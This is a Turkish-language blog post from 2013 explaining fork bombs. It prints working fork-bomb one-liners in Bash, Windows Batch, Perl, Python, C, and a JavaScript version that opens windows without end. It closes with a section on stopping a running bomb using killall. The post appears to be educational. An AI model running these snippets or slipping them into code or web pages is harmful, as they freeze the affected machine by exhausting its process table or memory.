---
layout: post
title: "Fork Bombasi"
date: 2013-09-26 12:55
comments: true
---
Fork bombası, bir prosesin kendini sürekli kopyalarak kullanılarbilir sistem kaynaklarını sömürmesi durumudur.
CPU ve RAM’i meşgul ederek bilgisayarınızın donmasına neden olur. 
# Fork Bombası Nasıl Yapılır ?

Unix türevi bir işletim sistemi kullanıyorsanız, fork sistem çağrısını kullanararak bir fork bombası yapabilirsiniz.<!-- more -->
fork fonksiyonu bulunduğu prosesin bir kopyasını oluşturur. exec fonksiyonu ilede o kopya prosese isteğiniz bir programı gömebilirsiniz.
Eğer siz fonksiyonu sonsuz döngüye sokup sürekli kendini kopyalamasını sağlarsınız elinizde nur topu gibi bir fork bombanız olur.
Çeşitli dillerde gerçekleme yapabilirsiniz. Bir kaç örnek vermek gerekirse:

## Bash

```bash
:(){ :|:& };:

```

## Windows Batch

```bash
:s
start "" %0
goto s

```
## Perl

```perl
perl -e "fork while fork" &
```

## Pyhton

```python
import os
while os.fork() or True: os.fork()

```

## C

```c
#include <unistd.h>
int main()
{
    while(1)
    fork();
}
```

## Javascript

```javascript
<script>
     while (true) {
     var w = window.open();
     w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
     }
</script>

```

## Etkisiz Hale Getirme

Yapıları yüzünden fork bombaları çalışmaya başlayınca durdurması zordur. Eğer şanslıysanız PID’ler bitmeden durdurabilirsiniz. Örnek olarak bash scripti alalım:

```bash
bomb() {
    bomb | bomb &
};
bomb
```

Yukardaki betik öz yineli şekilde kendi kopyasını üretiyor ve ampersan operatöründen dolayı bunu arka planda yapıyor. Eğer prosesin adını biliyorsak önce dondurup sonra da bütün çocuk ve ebeveyn prosesleri öldürürüz yani:

	killall -STOP prosesAdi
	killall -KILL prosesAdi

 Eğer boş PID kalmamışsa bombayı durdurmak için en az bir shell açık olmalıdır. Unix tabanlı sistemlerde her prosesin bir PIDsi vardır. Ama bu sınırlı bir rakamdır. Fork bombası PIDleri doldurursa onu durdurmak içim bir shell açamazsınız daha doğrusu yeni bir proses oluşturamazsınız. Bu durumda en az bir shell açık olmalıdır.
kaynak:wikipedia
